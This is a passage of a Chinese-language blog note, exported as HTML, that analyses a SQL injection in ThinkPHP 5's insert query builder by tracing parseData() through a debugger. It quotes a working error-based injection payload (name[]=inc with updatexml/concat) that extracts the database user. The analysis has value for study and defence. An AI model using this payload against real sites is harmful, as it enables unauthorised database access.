class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">57</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">58</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable-2">$result</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">59</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1322px;"></div><div class="CodeMirror-gutters" style="height: 1322px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p>&nbsp;</p><p><span>自己大概捋了一下思路 感觉已经知道了注入的顺序了 接下来就是待入payload梳理一下</span></p><p><span>这里用七月火师傅给的payload </span><code>?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code></p><p><span>接下来动态调试一下</span></p></li></ol><h3 id='1-入口函数'><span>1. 入口函数</span></h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122190254568.png" referrerpolicy="no-referrer" alt="image-20211122190254568"></p><h3 id='2-跟进到insert函数'><span>2. 跟进到insert函数</span></h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122190932980.png" referrerpolicy="no-referrer" alt="image-20211122190932980"></p><p><span>在红线的地方进行了一次解析,这次解析和漏洞关系不大,只是解析了当前sql语句或者这里应该称之为表达式进行了一次解析,主要内容就是,表名,字段名这些获得的结果如下</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$options</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Array</span> ( [<span class="cm-variable">table</span>] <span class="cm-operator">=&gt;</span> <span class="cm-variable">users</span> [<span class="cm-variable">multi</span>] <span class="cm-operator">=&gt;</span> <span class="cm-variable">Array</span> ( [<span class="cm-variable">AND</span>] <span class="cm-operator">=&gt;</span> <span class="cm-variable">Array</span> ( [<span class="cm-variable">id</span>] <span class="cm-operator">=&gt;</span> <span class="cm-variable">Array</span> ( [<span class="cm-number">0</span>] <span class="cm-operator">=&gt;</span> <span class="cm-number">1</span> ) ) ) [<span class="cm-variable">where</span>] <span class="cm-operator">=&gt;</span> <span class="cm-variable">Array</span> ( [<span class="cm-variable">AND</span>] <span class="cm-operator">=&gt;</span> <span class="cm-variable">Array</span> ( [<span class="cm-variable">id</span>] <span class="cm-operator">=&gt;</span> <span class="cm-number">1</span> ) ) [<span class="cm-variable">field</span>] <span class="cm-operator">=&gt;</span> <span class="cm-operator">*</span> [<span class="cm-variable">data</span>] <span class="cm-operator">=&gt;</span> <span class="cm-variable">Array</span> ( ) [<span class="cm-variable">strict</span>] <span class="cm-operator">=&gt;</span> <span class="cm-number">1</span> [<span class="cm-variable">master</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">lock</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">fetch_pdo</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">fetch_sql</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">distinct</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-builtin">join</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">union</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">group</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">having</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">limit</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">order</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">force</span>] <span class="cm-operator">=&gt;</span> [<span class="cm-variable">comment</span>] <span class="cm-operator">=&gt;</span> ) </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="height: 90px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>在接下来的地方执行了array_merge()函数,把两个数组合并成一个数组,并赋值给$data</span></p><p><span>此时$options[&#39;data&#39;]为空,而$data就是我们想要插入的键值对</span></p><p><span>接下来才是最重要的</span></p><h3 id='3-builderphpinsert'><span>3. builder.php/insert()</span></h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122211516906.png" referrerpolicy="no-referrer" alt="image-20211122211516906"><span>在这里就要跟进到builder类的insert()函数了,这个函数的功能是</span><strong><span>拼接出最后要执行SQL语句</span></strong></p><p><strong><span>所以要特别关注这个函数</span></strong></p><p><span>这里注意的是builder并非是builder类的实例化对象,而是Mysql类的</span></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637586782016-64ceefb6-bd92-4a90-9197-ccd16a64f272.png" referrerpolicy="no-referrer" alt="图片.png"></p><p><span>只是在这里的Mysql类继承了Builder类所以存在insert()函数,废话不多说直接看insert()函数</span></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637586806130-e59464d6-f8b9-4ff9-af73-960efb2613ba.png" referrerpolicy="no-referrer" alt="图片.png"></p><p><span>这里直接执行了一个parseData()函数继续跟进,这就就是漏洞的点了,打气精神来 everybody!</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>53</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">protected</span> <span class="cm-keyword">function</span> <span class="cm-def">parseData</span>(<span class="cm-variable-2">$data</span>, <span class="cm-variable-2">$options</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-keyword">empty</span>(<span class="cm-variable-2">$data</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> [];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 获取绑定信息</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$bind</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">query</span><span class="cm-operator">-&gt;</span><span class="cm-variable">getFieldsBind</span>(<span class="cm-variable-2">$options</span>[<span class="cm-string">'table'</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-string">'*'</span> <span class="cm-operator">==</span> <span class="cm-variable-2">$options</span>[<span class="cm-string">'field'</span>]) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$fields</span> <span class="cm-operator">=</span> <span class="cm-builtin">array_keys</span>(<span class="cm-variable-2">$bind</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">else</span> {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$fields</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$options</span>[<span class="cm-string">'field'</span>];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span> <span class="cm-operator">=</span> [];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">foreach</span> (<span class="cm-variable-2">$data</span> <span class="cm-keyword">as</span> <span class="cm-variable-2">$key</span> <span class="cm-operator">=&gt;</span> <span class="cm-variable-2">$val</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">print_r</span>(<span class="cm-variable-2">$val</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$item</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseKey</span>(<span class="cm-variable-2">$key</span>, <span class="cm-variable-2">$options</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-builtin">is_object</span>(<span class="cm-variable-2">$val</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-variable">method_exists</span>(<span class="cm-variable-2">$val</span>, <span class="cm-string">'__toString'</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 对象数据写入</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$val</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$val</span><span class="cm-operator">-&gt;</span><span class="cm-variable">__toString</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-atom">false</span> <span class="cm-operator">===</span> <span class="cm-builtin">strpos</span>(<span class="cm-variable-2">$key</span>, <span class="cm-string">'.'</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-operator">!</span><span class="cm-builtin">in_array</span>(<span class="cm-variable-2">$key</span>, <span class="cm-variable-2">$fields</span>, <span class="cm-atom">true</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable-2">$options</span>[<span class="cm-string">'strict'</span>]) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">throw</span> <span class="cm-keyword">new</span> <span class="cm-variable">Exception</span>(<span class="cm-string">'fields not exists:['</span> . <span class="cm-variable-2">$key</span> . <span class="cm-string">']'</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">elseif</span> (<span class="cm-builtin">is_null</span>(<span class="cm-variable-2">$val</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-string">'NULL'</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">elseif</span> (<span class="cm-builtin">is_array</span>(<span class="cm-variable-2">$val</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-operator">!</span><span class="cm-keyword">empty</span>(<span class="cm-variable-2">$val</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">28</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">switch</span> (<span class="cm-variable-2">$val</span>[<span class="cm-number">0</span>]) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">29</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">case</span> <span class="cm-string">'exp'</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">30</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$val</span>[<span class="cm-number">1</span>];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">31</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">break</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">32</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">case</span> <span class="cm-string">'inc'</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">33</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseKey</span>(<span class="cm-variable-2">$val</span>[<span class="cm-number">1</span>]) . <span class="cm-string">'+'</span> . <span class="cm-builtin">floatval</span>(<span class="cm-variable-2">$val</span>[<span class="cm-number">2</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">34</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">break</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">35</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">case</span> <span class="cm-string">'dec'</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">36</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseKey</span>(<span class="cm-variable-2">$val</span>[<span class="cm-number">1</span>]) . <span class="cm-string">'-'</span> . <span class="cm-builtin">floatval</span>(<span class="cm-variable-2">$val</span>[<span class="cm-number">2</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">37</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">break</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">38</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">39</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">echo</span> <span class="cm-string">"result:&lt;br&gt;"</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">40</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">print_r</span>(<span class="cm-variable-2">$result</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">41</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">elseif</span> (<span class="cm-builtin">is_scalar</span>(<span class="cm-variable-2">$val</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">42</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 过滤非标量数据</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">43</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-number">0</span> <span class="cm-operator">===</span> <span class="cm-builtin">strpos</span>(<span class="cm-variable-2">$val</span>, <span class="cm-string">':'</span>) <span 